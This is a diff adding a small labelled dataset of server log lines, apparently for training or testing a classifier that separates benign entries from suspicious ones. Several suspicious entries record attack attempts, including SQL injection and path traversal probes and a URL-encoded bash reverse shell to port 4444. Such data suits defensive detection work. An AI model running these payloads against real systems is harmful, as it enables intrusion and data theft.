@@ -1,0 +1,40 @@
+{"text": "Mar 26 06:03:28 edge02 sudo: deploy : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash", "label": "suspicious"}
+{"text": "May 12 01:31:39 auth01 kernel: [UFW BLOCK] OUT=eth0 SRC=10.0.0.89 DST=189.4.219.52 PROTO=TCP SPT=44626 DPT=4444 (unexpected outbound connection)", "label": "suspicious"}
+{"text": "Apr 26 08:53:40 db01 CRON[1708]: (ec2-user) CMD (run-parts /etc/cron.hourly)", "label": "benign"}
+{"text": "Jan  5 03:52:15 web02 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/journalctl -u sshd", "label": "benign"}
+{"text": "37.168.116.163 - - [15/Feb/2026:06:26:00 +0000] \"GET /login?user=admin'-- HTTP/1.1\" 500 488 \"-\" \"masscan/1.3\"", "label": "suspicious"}
+{"text": "Jan 13 08:40:18 edge02 dpkg[11122]: status installed openssl:amd64 3.0.13", "label": "benign"}
+{"text": "Feb  4 15:01:49 api03 kernel: [UFW BLOCK] OUT=eth0 SRC=10.0.0.43 DST=80.37.240.147 PROTO=TCP SPT=39935 DPT=4444 (unexpected outbound connection)", "label": "suspicious"}
+{"text": "49.128.174.80 - - [17/Jun/2026:03:03:17 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 403 2407 \"-\" \"masscan/1.3\"", "label": "suspicious"}
+{"text": "Mar 22 00:44:27 db01 CRON[3757]: (ec2-user) CMD (/opt/scripts/backup.sh)", "label": "benign"}
+{"text": "189.177.222.142 - - [05/Jan/2026:09:05:24 +0000] \"POST /dashboard HTTP/1.1\" 200 2121 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36\"", "label": "benign"}
+{"text": "208.163.161.223 - - [13/May/2026:17:04:39 +0000] \"GET /static/..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1\" 404 1616 \"-\" \"masscan/1.3\"", "label": "suspicious"}
+{"text": "27.192.199.51 - - [19/Feb/2026:04:20:59 +0000] \"GET / HTTP/1.1\" 200 41948 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15\"", "label": "benign"}
+{"text": "May  6 02:14:57 web02 systemd[1]: Started postgresql.service - postgresql daemon.", "label": "benign"}
+{"text": "46.39.136.178 - - [07/Apr/2026:08:03:14 +0000] \"POST /index.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/46.39.136.178/4444%200%3E%261 HTTP/1.1\" 200 369 \"-\" \"Nmap NSE\"", "label": "suspicious"}
+{"text": "Jun 26 22:57:14 web02 sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt-get upgrade", "label": "benign"}
+{"text": "49.160.131.151 - - [02/Mar/2026:02:11:59 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 200 594 \"-\" \"masscan/1.3\"", "label": "suspicious"}
+{"text": "Jan 28 19:24:21 web01 dpkg[28146]: status installed python3.11 3.11.8-1", "label": "benign"}
+{"text": "Jun  2 18:21:16 api03 CRON[2683]: (deploy) CMD (/usr/bin/certbot renew --quiet)", "label": "benign"}
+{"text": "Jan 15 19:02:37 auth01 sshd[8499]: Accepted publickey for svc_backup from 17.162.78.158 port 52503 ssh2: RSA SHA256:334364fb6d77618c1af6", "label": "benign"}
+{"text": "Jun  7 19:28:59 app05 sshd[8182]: Accepted publickey for www-data from 177.223.65.217 port 47699 ssh2: RSA SHA256:f4e4339552a2529e06ee", "label": "benign"}
+{"text": "Jun 22 00:40:12 web02 sshd[808]: Accepted publickey for admin from 83.100.231.192 port 50596 ssh2: RSA SHA256:471b30ffb98a9522cebf", "label": "benign"}
+{"text": "20.180.115.18 - - [31/May/2026:23:11:51 +0000] \"GET /favicon.ico HTTP/1.1\" 200 9859 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148\"", "label": "benign"}
+{"text": "Mar  7 20:44:50 api03 kernel: [UFW BLOCK] OUT=eth0 SRC=10.0.0.79 DST=114.92.27.8 PROTO=TCP SPT=37319 DPT=1337 (unexpected outbound connection)", "label": "suspicious"}
+{"text": "Feb  3 03:22:12 auth01 sshd[27383]: Accepted publickey for ec2-user from 80.180.133.131 port 56530 ssh2: RSA SHA256:ef2a173ac971574140cf", "label": "benign"}
+{"text": "Mar 18 21:35:55 api03 dpkg[22118]: status installed libssl3:amd64 3.0.13", "label": "benign"}
+{"text": "100.176.170.243 - - [23/Jun/2026:14:19:56 +0000] \"GET /wp-login.php HTTP/1.1\" 404 48 \"-\" \"Nmap NSE\"", "label": "suspicious"}
+{"text": "Jun  9 02:05:45 auth01 sudo: ubuntu : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash", "label": "suspicious"}
+{"text": "Jan  5 04:43:14 auth01 sshd[17330]: Accepted publickey for root from 102.250.25.52 port 34433 ssh2: RSA SHA256:4e42482d83dbb022ce1e", "label": "benign"}
+{"text": "106.243.236.220 - - [04/Jan/2026:22:15:18 +0000] \"GET /api?id=1;WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1\" 200 335 \"-\" \"nikto/2.5.0\"", "label": "suspicious"}
+{"text": "May  3 11:40:36 edge02 sshd[2872]: Failed password for test from 133.0.218.124 port 50075 ssh2", "label": "suspicious"}
+{"text": "Mar 24 01:01:34 auth01 dpkg[6695]: status installed ca-certificates 20240203", "label": "benign"}
+{"text": "193.222.142.166 - - [15/Mar/2026:02:47:48 +0000] \"GET /admin HTTP/1.1\" 200 2659 \"-\" \"ZmEu\"", "label": "suspicious"}
+{"text": "94.1.8.11 - - [26/Jan/2026:11:18:22 +0000] \"GET /view?page=../../../../proc/self/environ HTTP/1.1\" 403 2427 \"-\" \"Hello, World\"", "label": "suspicious"}
+{"text": "Feb 26 01:24:27 edge02 sshd[24167]: Failed password for oracle from 133.160.47.172 port 63319 ssh2", "label": "suspicious"}
+{"text": "Jan 28 10:10:38 web02 sudo: jenkins : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash", "label": "suspicious"}
+{"text": "Feb 13 03:33:08 db01 dpkg[24032]: status installed ca-certificates 20240203", "label": "benign"}
+{"text": "136.220.74.169 - - [29/Mar/2026:04:06:24 +0000] \"GET /images/logo.png HTTP/1.1\" 404 2276 \"-\" \"masscan/1.3\"", "label": "suspicious"}
+{"text": "Jun 11 19:37:39 auth01 CRON[5145]: (ubuntu) CMD (/opt/scripts/backup.sh)", "label": "benign"}
+{"text": "219.205.55.7 - - [12/Mar/2026:09:35:44 +0000] \"GET /index.html HTTP/1.1\" 304 31673 \"-\" \"Googlebot/2.1 (+http://www.google.com/bot.html)\"", "label": "benign"}
+{"text": "Apr 29 04:41:47 auth01 kernel: [ 72145.583] audit: exe=\"/tmp/.x\" uid=1018 attempted setuid(0)", "label": "suspicious"}
